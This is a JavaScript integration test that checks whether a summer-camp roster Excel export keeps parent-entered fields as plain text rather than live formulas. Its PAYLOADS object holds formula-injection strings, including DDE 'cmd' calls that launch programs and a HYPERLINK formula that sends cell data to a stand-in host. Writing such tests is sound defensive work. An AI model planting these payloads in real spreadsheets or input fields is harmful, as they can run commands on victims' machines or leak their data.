// Verifies the camp roster Excel export (src/lib/campRoster.ts) never lets
// attacker/parent-controlled text become a live spreadsheet formula —
// against the real database and the real ExcelJS output, not a mock.
//
// Run with: DATABASE_URL=postgres://user:pass@localhost:5432/dbname \
//   npx tsx db/tests/xlsx-safety.test.mjs
//
// Requires the schema from db/migrations/001_init.sql and the seed data
// from db/migrations/002_seed_weeks.sql to already be applied. Creates and
// then cancels one test registration in the "jun22" week — do not point
// this at a database with real registrations in it.

import ExcelJS from "exceljs";
import { unlinkSync, mkdtempSync, rmSync } from "fs";
import { execFileSync } from "child_process";
import { tmpdir } from "os";
import { join } from "path";
import { getPool } from "../../src/lib/db.ts";
import { reserveRegistration, cancelRegistration, newIdempotencyKey } from "../../src/lib/campDb.ts";
import { buildCampRosterWorkbook } from "../../src/lib/campRoster.ts";

const WEEK_ID = "jun22";
const PAYLOADS = {
  fullName: "=cmd|' /C calc'!A1",
  healthInfo: '=HYPERLINK("http://evil.example/leak?x="&A1,"click me")',
  parentName: "+2+3+cmd|' /C notepad'!A1",
  emergencyName: "-2+3",
  secondaryPhone: "@SUM(1+1)",
};

let pass = 0;
let fail = 0;
function check(label, cond) {
  if (cond) {
    pass++;
    console.log(`  [PASS] ${label}`);
  } else {
    fail++;
    console.log(`  [FAIL] ${label}`);
  }
}

function xmlEscape(s) {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&apos;");
}

console.log("=== Excel roster export: formula-injection-shaped fields must stay inert text ===");

const dir = mkdtempSync(join(tmpdir(), "xlsx-safety-"));
const outPath = join(dir, "roster.xlsx");
let registrationId;

try {
  const result = await reserveRegistration({
    idempotencyKey: newIdempotencyKey(),
    parentName: PAYLOADS.parentName,
    email: "xlsx-safety-test@example.com",
    primaryPhone: "555-000-0000",
    secondaryPhone: PAYLOADS.secondaryPhone,
    emergencyName: PAYLOADS.emergencyName,
    emergencyRelationship: "Aunt",
    emergencyPhone: "555-000-0001",
    codeOfConductAccepted: true,
    consentAccepted: true,
    weekIds: [WEEK_ID],
    children: [
      { fullName: PAYLOADS.fullName, dateOfBirth: "2016-01-01", age: "9", healthInfo: PAYLOADS.healthInfo },
    ],
  });
  if (!result.ok) throw new Error(`Setup failed: ${JSON.stringify(result)}`);
  registrationId = result.registrationId;

  const wb = await buildCampRosterWorkbook();
  await wb.xlsx.writeFile(outPath);

  // ExcelJS's own read-back must see plain strings, never formulas.
  const wb2 = new ExcelJS.Workbook();
  await wb2.xlsx.readFile(outPath);
  const ws = wb2.getWorksheet("Jun 22-26");
  const dataRow = ws.getRow(8); // first data row (header is row 7)
  const nameCell = dataRow.getCell(2); // Child's Full Name
  const healthCell = dataRow.getCell(9); // Allergies / Medical Notes

  check("child-name cell type is String, not Formula", nameCell.type !== ExcelJS.ValueType.Formula && nameCell.value === PAYLOADS.fullName);
  check("health-info cell type is String, not Formula", healthCell.type !== ExcelJS.ValueType.Formula && healthCell.value === PAYLOADS.healthInfo);
  check("neither cell exposes a .formula property", !nameCell.formula && !healthCell.formula);

  // Raw OOXML: no cell may be wrapped in a <f> (formula) tag anywhere.
  const sheetXmlFiles = execFileSync("unzip", ["-Z1", outPath]).toString().split("\n").filter((f) => f.startsWith("xl/worksheets/sheet"));
  let hasFormulaTag = false;
  for (const entry of sheetXmlFiles) {
    const xml = execFileSync("unzip", ["-p", outPath, entry]).toString();
    if (xml.includes("<f>") || xml.includes("<f ")) hasFormulaTag = true;
  }
  check("no <f> (formula) tag anywhere in any worksheet XML", !hasFormulaTag);

  const sharedStrings = execFileSync("unzip", ["-p", outPath, "xl/sharedStrings.xml"]).toString();
  check("child-name payload appears verbatim (XML-escaped) inside a <t> text node", sharedStrings.includes(`<t>${xmlEscape(PAYLOADS.fullName)}</t>`));
  check("health-info payload appears verbatim (XML-escaped) inside a <t> text node", sharedStrings.includes(`<t>${xmlEscape(PAYLOADS.healthInfo)}</t>`));

  // The cover sheet is always sheet1 (buildCoverSheet runs first); jun22 is
  // the first week in content.ts's juniorCamps.weeks, so its tab is sheet2.
  const jun22Sheet = execFileSync("unzip", ["-p", outPath, "xl/worksheets/sheet2.xml"]).toString();
  const cellMatch = jun22Sheet.match(/<c r="B8"[^>]*>/);
  const cellTag = cellMatch ? cellMatch[0] : "";
  const cellRegion = cellMatch ? jun22Sheet.slice(jun22Sheet.indexOf(cellTag), jun22Sheet.indexOf(cellTag) + 120) : "";
  check('child-name cell (B8) is explicitly typed t="s" (shared string) in the OOXML', /t="s"/.test(cellTag) && !/<f[ >]/.test(cellRegion));
} finally {
  if (registrationId) {
    // Exercises the real cancel path (releases capacity, writes an audit
    // entry) and then hard-deletes this test's own row so repeated runs
    // leave the database exactly as they found it.
    await cancelRegistration(registrationId, "xlsx-safety-test cleanup");
    const pool = getPool();
    await pool.query(`DELETE FROM registration_spots WHERE registration_id = $1`, [registrationId]);
    await pool.query(`DELETE FROM children WHERE registration_id = $1`, [registrationId]);
    await pool.query(`DELETE FROM admin_audit_log WHERE target_id = $1`, [registrationId]);
    await pool.query(`DELETE FROM registrations WHERE id = $1`, [registrationId]);
  }
  try {
    unlinkSync(outPath);
  } catch {}
  rmSync(dir, { recursive: true, force: true });
}

console.log(`\n${fail === 0 ? "ALL TESTS PASS" : "SOME TESTS FAILED"} (${pass} pass, ${fail} fail)`);
process.exit(fail === 0 ? 0 : 1);
